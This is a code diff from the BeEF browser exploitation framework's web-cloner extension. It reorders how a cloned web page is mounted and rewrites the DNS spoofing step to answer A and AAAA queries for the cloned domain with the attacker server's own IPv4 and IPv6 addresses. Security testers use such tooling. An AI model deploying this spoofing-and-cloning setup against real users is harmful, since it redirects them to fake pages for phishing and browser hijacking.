@@ -111,20 +111,32 @@ module BeEF
             interceptor.set :cloned_page, get_page_content(file_path)
             interceptor.set :db_entry, persist_page(url, mount)
 
-            @http_server.mount("#{mount}", interceptor.new)
-            print_info "Mounting cloned page on URL [#{mount}]"
-            @http_server.remap
-
             # Add a DNS record spoofing the address of the cloned webpage as the BeEF server
             if dns_spoof
               dns = BeEF::Extension::Dns::Server.instance
-              ip = Socket.ip_address_list.detect { |i| !(i.ipv4_loopback? || i.ipv6_loopback?) }
+              ipv4 = Socket.ip_address_list.detect { |ai| ai.ipv4? && !ai.ipv4_loopback? }.ip_address
+              ipv6 = Socket.ip_address_list.detect { |ai| ai.ipv6? && !ai.ipv6_loopback? }.ip_address
+              ipv6.gsub!(/%\w*$/, '')
               domain = url.gsub(%r{^http://}, '')
 
-              id = dns.add_rule(domain, Resolv::DNS::Resource::IN::A) do |transaction|
-                transaction.respond!(ip.ip_address)
-              end
+              dns.add_rule(
+                :pattern  => domain,
+                :resource => Resolv::DNS::Resource::IN::A,
+                :response => ipv4
+              ) unless ipv4.nil?
+
+              dns.add_rule(
+                :pattern  => domain,
+                :resource => Resolv::DNS::Resource::IN::AAAA,
+                :response => ipv6
+              ) unless ipv6.nil?
+
+              print_info "DNS records spoofed [A: #{ipv4} AAAA: #{ipv6}]"
             end
+
+            print_info "Mounting cloned page on URL [#{mount}]"
+            @http_server.mount("#{mount}", interceptor.new)
+            @http_server.remap
 
             success = true
           else
